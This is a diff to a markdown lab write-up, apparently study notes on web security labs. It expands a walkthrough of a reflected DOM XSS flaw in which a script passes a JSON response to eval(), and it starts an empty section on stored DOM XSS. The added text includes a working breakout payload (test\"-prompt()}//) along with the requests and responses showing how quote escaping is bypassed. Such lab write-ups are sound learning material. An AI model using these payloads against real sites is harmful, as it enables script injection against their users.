@@ -354,16 +354,15 @@ This instance contains a DOM-based XSS vulnerability in an `AngularJS` expressio
 -
 
 #### 10. Reflected DOM XSS
-In this instance, a script on the page processes the reflected data (user input) in an unsafe way, ultimately writing it to a dangerous sink.
+In this instance, a script on the page processes reflected data (user input) with `eval()` without any sanitization and ultimately writes it to a dangerous sink.
 
 <details markdown="1">
   <summary>Click me to expand the process</summary>
 
-1. The `xhr.open` send a GET request (user input retrieve from `path` + `window.location.search`) and fetch data to server using `XMLHttpRequest`.
-
-2. Then it parses the response (`this.responseText`) with `eval()`.
-
-3. Lastly, it dynamically create and display search results (`displaySearchResults`) in the HTML DOM.
+1. First, I find the script used in the web application under the Network tab on the Inspection page.
+   - The `xhr.open` method sends a GET request (with user input retrieved from `path + window.location.search`) and fetches data from the server using `XMLHttpRequest`.
+   - Then it parses the JSON response (`this.responseText`) with `eval()`.
+   - Lastly, it dynamically create and display search results (`displaySearchResults`) in the HTML DOM.
 
    ```javascript
    var xhr = new XMLHttpRequest();
@@ -376,8 +375,42 @@ In this instance, a script on the page processes the reflected data (user input)
    xhr.open("GET", path + window.location.search);
    xhr.send();
    ```
+   
+2. I send a test request and intercept the response using Burp Proxy.
 
-you need to craft your input so that you "escape" or break out of the expected JSON structure (e.g., the "value" part). This is because the code expects this.responseText to be a JSON-like object string, and if you inject malicious JavaScript code inside the "value" string as-is, it will be treated as part of the JSON and likely cause a syntax error.
+   ```json
+   {"results":[],"searchTerm":"test"}
+   ```
+
+3. Because the script uses `eval()` to process the response, I can insert the `prompt()` function (see JSON Values in the [JSON Syntax](https://www.w3schools.com/js/js_json_syntax.asp))."
+   Now that I know the JSON structure, I create an input to break out of the expected structure in Burp Repeater.
+
+4. In the response to my first payload attempt `test\"-prompt()}//`, the double quote is escaped by the application, so I add an extra backslash (`\`) to bypass it.
+
+  ~~~
+  1-st_Request: ?search=test"-prompt()}//
+  Response: {"results":[],"searchTerm":"test\"-prompt()}//"}
+  -
+  2-nd_Request: ?search=test\"-prompt()}//
+  Response: {"results":[],"searchTerm":"test\\"-prompt()}//"}
+  ~~~
+
+  {: .box-note}
+  **Note:** The [Arithmetic Operators](https://www.w3schools.com/programming/prog_operators_arithmetic.php#gsc.tab=0) (`-`) forces `prompt()` to be parsed and executed as part of an expression. And ensuring it is executed immediately, not just ignored.
+  And the `//` comments out whatever is after it.
+
+</details>
+-
+
+#### 11. Stored DOM XSS
+In this instance, the application's comment functionality is vulnerable to stored DOM XSS, allowing me to embed and execute a `prompt()` call.
+
+<details markdown="1">
+  <summary>Click me to expand the process</summary>
+
+1.
+
+
 
 
 </details>
